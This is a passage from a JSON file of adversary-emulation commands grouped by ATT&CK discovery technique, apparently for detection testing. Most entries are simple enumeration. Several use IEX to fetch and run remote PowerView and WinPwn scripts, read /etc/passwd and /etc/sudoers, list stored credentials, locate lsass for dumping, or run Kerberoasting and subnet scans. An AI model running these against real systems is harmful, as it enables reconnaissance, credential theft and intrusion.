         "command": "net time \\\\localhost && w32tm /tz"
      },
      {
         "technique_id": "T1124",
         "technique_name": "System Time Discovery",
         "tactic": "discovery",
         "description": "Identify system time. Upon execution, the local computer system time and timezone will be displayed. \n",
         "command": "date"
      },
      {
         "technique_id": "T1124",
         "technique_name": "System Time Discovery",
         "tactic": "discovery",
         "description": "identifies DCRat delay time tactics using w32tm.\nhttps://research.splunk.com/endpoint/b2cc69e7-11ba-42dc-a269-59c069a48870/\nhttps://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains\n",
         "command": "W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2"
      },
      {
         "technique_id": "T1124",
         "technique_name": "System Time Discovery",
         "tactic": "discovery",
         "description": "get current system time (ISO 8601)",
         "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n"
      }
   ],
   "T1033": [
      {
         "technique_id": "T1033",
         "technique_name": "System Owner/User Discovery",
         "tactic": "discovery",
         "description": "Identify System owner or users on an endpoint\n\nUpon successful execution, sh will stdout list of usernames.\n",
         "command": "users; w; who"
      },
      {
         "technique_id": "T1033",
         "technique_name": "System Owner/User Discovery",
         "tactic": "discovery",
         "description": "SocGholish performs whoami discovery commands and outputs the results to a tmp file. \nThe test will generate a filename similar to the random one generated during execution and write the file to AppData\\Temp.\n\nReference: https://redcanary.com/threat-detection-report/threats/socgholish/\n",
         "command": "$TokenSet = @{;   U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ';   N = [Char[]]'0123456789'; }; $Upper = Get-Random -Count 5 -InputObject $TokenSet.U; $Number = Get-Random -Count 5 -InputObject $TokenSet.N; $StringSet = $Upper + $Number; $rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''; $file = \"rad\" + $rad + \".tmp\"; whoami.exe /all >> $env:temp\\$file"
      },
      {
         "technique_id": "T1033",
         "technique_name": "System Owner/User Discovery",
         "tactic": "discovery",
         "description": "Use the PowerShell \"GetCurrent\" method of the WindowsIdentity .NET class to identify the logged user.",
         "command": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt"
      },
      {
         "technique_id": "T1033",
         "technique_name": "System Owner/User Discovery",
         "tactic": "discovery",
         "description": "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose"
      },
      {
         "technique_id": "T1033",
         "technique_name": "System Owner/User Discovery",
         "tactic": "discovery",
         "description": "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.\n",
         "command": "cmd.exe /C whoami && wmic useraccount get /ALL && quser /SERVER:\"#{computer_name}\" && quser && qwinsta.exe /server:#{computer_name} && qwinsta.exe && for /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt && @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt"
      },
      {
         "technique_id": "T1033",
         "technique_name": "System Owner/User Discovery",
         "tactic": "discovery",
         "description": "Use the PowerShell environment variables to identify the current logged user.",
         "command": "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt ; $env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append"
      },
      {
         "technique_id": "T1033",
         "technique_name": "System Owner/User Discovery",
         "tactic": "discovery",
         "description": "Get Service Accounts for a domain",
         "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n"
      },
      {
         "technique_id": "T1033",
         "technique_name": "System Owner/User Discovery",
         "tactic": "discovery",
         "description": "Get Administrator users for a computer",
         "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n"
      },
      {
         "technique_id": "T1033",
         "technique_name": "System Owner/User Discovery",
         "tactic": "discovery",
         "description": "Obtain user from current session",
         "command": "whoami\n"
      },
      {
         "technique_id": "T1033",
         "technique_name": "System Owner/User Discovery",
         "tactic": "discovery",
         "description": "Find user running agent",
         "command": "whoami"
      }
   ],
   "T1049": [
      {
         "technique_id": "T1049",
         "technique_name": "System Network Connections Discovery",
         "tactic": "discovery",
         "description": "Get a listing of network connections.\n\nUpon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.\n",
         "command": "Get-NetTCPConnection"
      },
      {
         "technique_id": "T1049",
         "technique_name": "System Network Connections Discovery",
         "tactic": "discovery",
         "description": "Get a listing of network connections.\n\nUpon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.\n",
         "command": "netstat; who -a"
      },
      {
         "technique_id": "T1049",
         "technique_name": "System Network Connections Discovery",
         "tactic": "discovery",
         "description": "Get a listing of network connections, domains, domain users, and etc.  \nsharpview.exe located in the bin folder, an opensource red-team tool.\nUpon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout.\n",
         "command": "$syntaxList = \"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\" ; foreach ($syntax in $syntaxList) {; C:\\Users\\puma-4\\Desktop\\SharpView.exe $syntax -}"
      },
      {
         "technique_id": "T1049",
         "technique_name": "System Network Connections Discovery",
         "tactic": "discovery",
         "description": "Get a listing of network connections.\n\nUpon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout.\n",
         "command": "netstat && net use && net sessions"
      },
      {
         "technique_id": "T1049",
         "technique_name": "System Network Connections Discovery",
         "tactic": "discovery",
         "description": "Find System Network Connections",
         "command": "netstat -anto\n"
      }
   ],
   "T1046": [
      {
         "technique_id": "T1046",
         "technique_name": "Network Service Discovery",
         "tactic": "discovery",
         "description": "Scanning common ports in a /24 subnet. If no IP address for the target subnet is specified the test tries to determine the attacking machine's \"primary\" IPv4 address first and then scans that address with a /24 netmask.\nThe connection attempts to use a timeout parameter in milliseconds to speed up the scan. Please note the atomic might not print any output until the scans are completed.\n",
         "command": "$ipAddr = \"\"; if ($ipAddr -eq \"\") {;     $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1;     Write-Host \"[i] Using Interface $interface\";     $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress; }; Write-Host \"[i] Base IP-Address for Subnet: $ipAddr\"; $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1); Write-Host \"[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\"; $ports = 445, 3389; $subnetIPs = 1..254 | ForEach-Object { \"$subnetSubstring$_\" }; foreach ($ip in $subnetIPs) {;     foreach ($port in $ports) {;       try {;           $tcp = New-Object Net.Sockets.TcpClient;           $tcp.ConnectAsync($ip, $port).Wait(200) | Out-Null;       } catch {};       if ($tcp.Connected) {;           $tcp.Close();           Write-Host \"Port $port is open on $ip\";       };     }; }"
      },
      {
         "technique_id": "T1046",
         "technique_name": "Network Service Discovery",
         "tactic": "discovery",
         "description": "Scan ports to check for listening ports for the local host 127.0.0.1",
         "command": "nmap 127.0.0.1"
      },
      {
         "technique_id": "T1046",
         "technique_name": "Network Service Discovery",
         "tactic": "discovery",
         "description": "Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); bluekeep -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1046",
         "technique_name": "Network Service Discovery",
         "tactic": "discovery",
         "description": "Scan ports to check for listening ports.\n\nUpon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.\n",
         "command": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/192.168.1.1/$port) && echo port $port is open ; done"
      },
      {
         "technique_id": "T1046",
         "technique_name": "Network Service Discovery",
         "tactic": "discovery",
         "description": "Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); fruit -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1046",
         "technique_name": "Network Service Discovery",
         "tactic": "discovery",
         "description": "Scan ports to check for listening ports with python\n",
         "command": "python3 \"./53b103_T1046.py\" -i 127.0.0.1"
      },
      {
         "technique_id": "T1046",
         "technique_name": "Network Service Discovery",
         "tactic": "discovery",
         "description": "Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.",
         "command": "docker build -t t1046 /root/AtomicRedTeam/atomics/T1046/src/; docker run --name t1046_container  -d -t t1046; docker exec t1046_container ./test.sh"
      },
      {
         "technique_id": "T1046",
         "technique_name": "Network Service Discovery",
         "tactic": "discovery",
         "description": "Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); spoolvulnscan -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1046",
         "technique_name": "Network Service Discovery",
         "tactic": "discovery",
         "description": "Scan ports to check for listening ports with Nmap.\n\nUpon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.\n",
         "command": "if [ -x \"$(command -v telnet)\" ]; then : ; else (which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet); fi; if [ -x \"$(command -v nc)\" ]; then : ; else (which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat); fi; if [ -x \"$(command -v nmap)\" ]; then : ; else (which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap); fi;  ;  sudo nmap -sS 192.168.1.0/24 -p 80; telnet 192.168.1.1 80; nc -nv 192.168.1.1 80"
      },
      {
         "technique_id": "T1046",
         "technique_name": "Network Service Discovery",
         "tactic": "discovery",
         "description": "Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); MS17-10 -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1046",
         "technique_name": "Network Service Scanning",
         "tactic": "discovery",
         "description": "Scans the local network for common open ports",
         "command": "Import-Module ./basic_scanner.ps1;\n$ports = @(22, 53, 80, 445);\nGet-NetIPConfiguration | ?{$_.NetAdapter.Status -ne \"Disconnected\"} | Get-NetIPaddress -AddressFamily IPv4 | %{\n    $ipv4 = $_.IPAddress;\n    $prefixLength = $_.PrefixLength;\n    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;\n};\n"
      },
      {
         "technique_id": "T1046",
         "technique_name": "Network Service Scanning",
         "tactic": "discovery",
         "description": "Uses nmap to fingerprint services that were network accessible",
         "command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"
      },
      {
         "technique_id": "T1046",
         "technique_name": "Network Service Scanning",
         "tactic": "discovery",
         "description": "Use dropped scanner to find open popular ports",
         "command": "python3 scanner.py -i #{remote.host.ip}\n"
      }
   ],
   "T1087.001": [
      {
         "technique_id": "T1087.001",
         "technique_name": "Account Discovery: Local Account",
         "tactic": "discovery",
         "description": "List opened files by user\n",
         "command": "username=$(id -u -n) && lsof -u $username"
      },
      {
         "technique_id": "T1087.001",
         "technique_name": "Account Discovery: Local Account",
         "tactic": "discovery",
         "description": "Show if a user account has ever logged in remotely\n",
         "command": "if [ -x \"$(command -v lastlog)\" ]; then : ; else sudo apt-get install login; exit 1;; fi;  ;  lastlog > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt"
      },
      {
         "technique_id": "T1087.001",
         "technique_name": "Account Discovery: Local Account",
         "tactic": "discovery",
         "description": "Enumerate logged on users. Upon execution, logged on users will be displayed.\n",
         "command": "query user"
      },
      {
         "technique_id": "T1087.001",
         "technique_name": "Account Discovery: Local Account",
         "tactic": "discovery",
         "description": "Utilize local utilities to enumerate users and groups\n",
         "command": "dscl . list /Groups; dscl . list /Users; dscl . list /Users | grep -v '_'; dscacheutil -q group; dscacheutil -q user"
      },
      {
         "technique_id": "T1087.001",
         "technique_name": "Account Discovery: Local Account",
         "tactic": "discovery",
         "description": "Enumerate all accounts\nUpon execution, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
         "command": "net user && dir c:\\Users\\ && cmdkey.exe /list && net localgroup \"Users\" && net localgroup"
      },
      {
         "technique_id": "T1087.001",
         "technique_name": "Account Discovery: Local Account",
         "tactic": "discovery",
         "description": "View accounts with UID 0\n",
         "command": "grep 'x:0:' /etc/passwd > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt 2>/dev/null"
      },
      {
         "technique_id": "T1087.001",
         "technique_name": "Account Discovery: Local Account",
         "tactic": "discovery",
         "description": "(requires root)\n",
         "command": "sudo cat /etc/sudoers > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt"
      },
      {
         "technique_id": "T1087.001",
         "technique_name": "Account Discovery: Local Account",
         "tactic": "discovery",
         "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
         "command": "net user; get-localuser; get-localgroupmember -group Users; cmdkey.exe /list; ls C:/Users; get-childitem C:\\Users\\; dir C:\\Users\\; get-localgroup; net localgroup"
      },
      {
         "technique_id": "T1087.001",
         "technique_name": "Account Discovery: Local Account",
         "tactic": "discovery",
         "description": "Enumerate all accounts by copying /etc/passwd to another file\n",
         "command": "cat /etc/passwd > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt"
      },
      {
         "technique_id": "T1087.001",
         "technique_name": "Account Discovery: Local Account",
         "tactic": "discovery",
         "description": "Utilize groups and id to enumerate users and groups\n",
         "command": "groups; id"
      },
      {
         "technique_id": "T1087.001",
         "technique_name": "Account Discovery: Local Account",
         "tactic": "discovery",
         "description": "Identify all local users",
         "command": "dscl . list /Users | grep -v '_'\n"
      },
      {
         "technique_id": "T1087.001",
         "technique_name": "Account Discovery: Local Account",
         "tactic": "discovery",
         "description": "Get a list of all local users",
         "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n"
      }
   ],
   "T1083": [
      {
         "technique_id": "T1083",
         "technique_name": "File and Directory Discovery",
         "tactic": "discovery",
         "description": "Find or discover files on the file system.  Upon successful execution, this test will output the results of all the data discovery commands to a specified file.\n",
         "command": "dir /s c:\\ >> %temp%\\T1083Test1.txt && dir /s \"c:\\Documents and Settings\" >> %temp%\\T1083Test1.txt && dir /s \"c:\\Program Files\\\" >> %temp%\\T1083Test1.txt && dir \"%systemdrive%\\Users\\*.*\" >> %temp%\\T1083Test1.txt && dir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> %temp%\\T1083Test1.txt && dir \"%userprofile%\\Desktop\\*.*\" >> %temp%\\T1083Test1.txt && tree /F >> %temp%\\T1083Test1.txt"
      },
      {
         "technique_id": "T1083",
         "technique_name": "File and Directory Discovery",
         "tactic": "discovery",
         "description": "Find or discover files on the file system. Upon execution, file and folder information will be displayed.\n",
         "command": "ls -recurse; get-childitem -recurse; gci -recurse"
      },
      {
         "technique_id": "T1083",
         "technique_name": "File and Directory Discovery",
         "tactic": "discovery",
         "description": "Find or discover files on the file system\n",
         "command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt; if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi; find . -type f -iname *.pdf >> /tmp/T1083.txt; cat /tmp/T1083.txt; find . -type f -name \".*\""
      },
      {
         "technique_id": "T1083",
         "technique_name": "File and Directory Discovery",
         "tactic": "discovery",
         "description": "This test emulates MAZE ransomware's ability to enumerate directories using Powershell. \nUpon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window. \nSee https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
         "command": "$folderarray = @(\"Desktop\", \"Downloads\", \"Documents\", \"AppData/Local\", \"AppData/Roaming\"); Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt; Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $env:temp\\T1083Test5.txt; Get-ChildItem -Path \"${env:ProgramFiles(x86)}\" -erroraction silentlycontinue | Out-File -append $env:temp\\T1083Test5.txt; $UsersFolder = \"$env:homedrive\\Users\\\"; foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) ; {; foreach ($secondarydirectory in $folderarray);  {Get-ChildItem -Path \"$UsersFolder/$directory/$secondarydirectory\" -ErrorAction SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt}; }; cat $env:temp\\T1083Test5.txt"
      },
      {
         "technique_id": "T1083",
         "technique_name": "File and Directory Discovery",
         "tactic": "discovery",
         "description": "Launches the DirLister executable for a short period of time and then exits.\n\nRecently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible directories and files.",
         "command": "Start-Process \"C:\\Users\\puma-4\\Desktop\\DirLister.exe\"; Start-Sleep -Second 4; Stop-Process -Name \"DirLister\""
      },
      {
         "technique_id": "T1083",
         "technique_name": "File and Directory Discovery",
         "tactic": "discovery",
         "description": "Find or discover files on the file system\n\nReferences:\n\nhttp://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/\n\nhttps://perishablepress.com/list-files-folders-recursively-terminal/\n",
         "command": "ls -a >> /tmp/T1083.txt; if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi; file */* *>> /tmp/T1083.txt; cat /tmp/T1083.txt 2>/dev/null; find . -type f; ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'; locate *; which sh"
      },
      {
         "technique_id": "T1083",
         "technique_name": "File and Directory Discovery",
         "tactic": "discovery",
         "description": "Locate file that appears in the printer queue",
         "command": "find ~ -type f -name #{host.print.file} 2>/dev/null"
      },
      {
         "technique_id": "T1083",
         "technique_name": "File and Directory Discovery",
         "tactic": "discovery",
         "description": "Print the current working directory on the system",
         "command": "pwd\n"
      },
      {
         "technique_id": "T1083",
         "technique_name": "File and Directory Discovery",
         "tactic": "discovery",
         "description": "Find or discover files on the file system",
         "command": "Get-ChildItem -Path #{host.system.path}\n"
      },
      {
         "technique_id": "T1083",
         "technique_name": "File and Directory Discovery",
         "tactic": "discovery",
         "description": "List contents of current directory",
         "command": "ls\n"
      }
   ],
   "T1069.001": [
      {
         "technique_id": "T1069.001",
         "technique_name": "Permission Groups Discovery: Local Groups",
         "tactic": "discovery",
         "description": "This module runs the Windows executable of SharpHound in order to remotely list members of the local Administrators group (SAMR)\n",
         "command": "New-Item -Path \"$env:TEMP\\SharpHound\\\" -ItemType Directory > $null; & \"C:\\Users\\puma-4\\Desktop\\SharpHound.exe\" -d \"$env:UserDnsDomain\" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \"$env:TEMP\\SharpHound\\\""
      },
      {
         "technique_id": "T1069.001",
         "technique_name": "Permission Groups Discovery: Local Groups",
         "tactic": "discovery",
         "description": "Permission Groups Discovery\n",
         "command": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v id)\" ]; then id; else echo \"id is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v getent)\" ]; then getent group; else echo \"getent is missing from the machine. skipping...\"; fi; cat /etc/group"
      },
      {
         "technique_id": "T1069.001",
         "technique_name": "Permission Groups Discovery: Local Groups",
         "tactic": "discovery",
         "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
         "command": "net localgroup && net localgroup \"Administrators\""
      },
      {
         "technique_id": "T1069.001",
         "technique_name": "Permission Groups Discovery: Local Groups",
         "tactic": "discovery",
         "description": "Utilizing wmic.exe to enumerate groups on the local system. Upon execution, information will be displayed of local groups on system.\n",
         "command": "wmic group get name"
      },
      {
         "technique_id": "T1069.001",
         "technique_name": "Permission Groups Discovery: Local Groups",
         "tactic": "discovery",
         "description": "Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.\n",
         "command": "Get-WMIObject Win32_Group"
      },
      {
         "technique_id": "T1069.001",
         "technique_name": "Permission Groups Discovery: Local Groups",
         "tactic": "discovery",
         "description": "Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.",
         "command": "docker build -t t1069 $PathtoAtomicsFolder/T1069.001/src/; docker run --name t1069_container  -d -t t1069; docker exec t1069_container ./test.sh"
      },
      {
         "technique_id": "T1069.001",
         "technique_name": "Permission Groups Discovery: Local Groups",
         "tactic": "discovery",
         "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
         "command": "get-localgroup; Get-LocalGroupMember -Name \"Administrators\""
      },
      {
         "technique_id": "T1069.001",
         "technique_name": "Permission Groups Discovery: Local Groups",
         "tactic": "discovery",
         "description": "Summary of permission and security groups",
         "command": "gpresult /R\n"
      }
   ],
   "T1613": [
      {
         "technique_id": "T1613",
         "technique_name": "Container and Resource Discovery",
         "tactic": "discovery",
         "description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment.",
         "command": "docker build -t t1613  $PathtoAtomicsFolder/T1613/src/; docker run --name t1613_container  -d -t t1613; docker ps; docker stats --no-stream; docker inspect $(docker ps -l -q --filter ancestor=t1613)"
      }
   ],
   "T1057": [
      {
         "technique_id": "T1057",
         "technique_name": "Process Discovery",
         "tactic": "discovery",
         "description": "Utilize windows management instrumentation to identify processes.\n\nUpon successful execution, WMIC will execute process to list processes. Output will be via stdout. \n",
         "command": "wmic process get /format:list"
      },
      {
         "technique_id": "T1057",
         "technique_name": "Process Discovery",
         "tactic": "discovery",
         "description": "Utilize ps to identify processes.\n\nUpon successful execution, sh will execute ps and output to /tmp/loot.txt.\n",
         "command": "ps >> /tmp/loot.txt; ps aux >> /tmp/loot.txt"
      },
      {
         "technique_id": "T1057",
         "technique_name": "Process Discovery",
         "tactic": "discovery",
         "description": "Utilize tasklist to identify processes.\n\nUpon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. \n",
         "command": "tasklist"
      },
      {
         "technique_id": "T1057",
         "technique_name": "Process Discovery",
         "tactic": "discovery",
         "description": "Utilize Get-Process PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. \n",
         "command": "Get-Process"
      },
      {
         "technique_id": "T1057",
         "technique_name": "Process Discovery",
         "tactic": "discovery",
         "description": "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. \n",
         "command": "get-wmiObject -class Win32_Process"
      },
      {
         "technique_id": "T1057",
         "technique_name": "Process Discovery",
         "tactic": "discovery",
         "description": "Adversaries may use command line tools to discover specific processes in preparation of further attacks. \nExamples of this could be discovering the PID of lsass.exe to dump its memory or discovering whether specific security processes (e.g. AV or EDR) are running.\n",
         "command": "tasklist | findstr lsass"
      },
      {
         "technique_id": "T1057",
         "technique_name": "Process Discovery",
         "tactic": "discovery",
         "description": "Discovers processes that the current user has the ability to access and selects an injectable one",
         "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json\n"
      },
      {
         "technique_id": "T1057",
         "technique_name": "Process Discovery",
         "tactic": "discovery",
         "description": "Enumerate running virtual machines on hypervisor",
         "command": "acrnctl list\n"
      },
      {
         "technique_id": "T1057",
         "technique_name": "Process Discovery",
         "tactic": "discovery",
         "description": "Get process info for processes running as a user",
         "command": "ps aux | grep #{host.user.name}\n"
      },
      {
         "technique_id": "T1057",
         "technique_name": "Process Discovery",
         "tactic": "discovery",
         "description": "Display information about current system processes",
         "command": "ps\n"
      },
      {
         "technique_id": "T1057",
         "technique_name": "Process Discovery",
         "tactic": "discovery",
         "description": "Capture running processes and their loaded DLLs",
         "command": "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtool.log\n"
      },
      {
         "technique_id": "T1057",
         "technique_name": "Process Discovery",
         "tactic": "discovery",
         "description": "Get process info for LSASS",
         "command": "$ps = get-process | select processname,Id;\n$valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} };\n$valid | ConvertTo-Json\n"
      },
      {
         "technique_id": "T1057",
         "technique_name": "Process Discovery",
         "tactic": "discovery",
         "description": "Capture running processes via PowerShell",
         "command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"
      },
      {
         "technique_id": "T1057",
         "technique_name": "Process Discovery",
         "tactic": "discovery",
         "description": "Identify system processes",
         "command": "Get-Process"
      },
      {
         "technique_id": "T1057",
         "technique_name": "Process Discovery",
         "tactic": "collection",
         "description": "Process discovery via SysInternals pstool",
         "command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse\n"
      }
   ],
   "T1518.001": [
      {
         "technique_id": "T1518.001",
         "technique_name": "Software Discovery: Security Software Discovery",
         "tactic": "discovery",
         "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n",
         "command": "ps aux | egrep 'Little\\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'"
      },
      {
         "technique_id": "T1518.001",
         "technique_name": "Software Discovery: Security Software Discovery",
         "tactic": "discovery",
         "description": "Windows Defender Enumeration via different built-in windows native tools.\nwhen sucessfully executed, information about windows defender is displayed.\n",
         "command": "Get-Service WinDefend; Get-MpComputerStatus; Get-MpThreat"
      },
      {
         "technique_id": "T1518.001",
         "technique_name": "Software Discovery: Security Software Discovery",
         "tactic": "discovery",
         "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n",
         "command": "ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'"
      },
      {
         "technique_id": "T1518.001",
         "technique_name": "Software Discovery: Security Software Discovery",
         "tactic": "discovery",
         "description": "Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).\n\nwhen sucessfully executed, the test is going to display sysmon driver instance if it is installed.\n",
         "command": "fltmc.exe | findstr.exe 385201"
      },
      {
         "technique_id": "T1518.001",
         "technique_name": "Software Discovery: Security Software Discovery",
         "tactic": "discovery",
         "description": "Discovery of installed antivirus products via Get-CimInstance and Get-WmiObject cmdlets of powershell.\n\nwhen sucessfully executed, information about installed AV software is displayed..\n",
         "command": "powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct && powershell Get-WmiObject -Namespace root\\securitycenter2 -Class antivirusproduct"
      },
      {
         "technique_id": "T1518.001",
         "technique_name": "Software Discovery: Security Software Discovery",
         "tactic": "discovery",
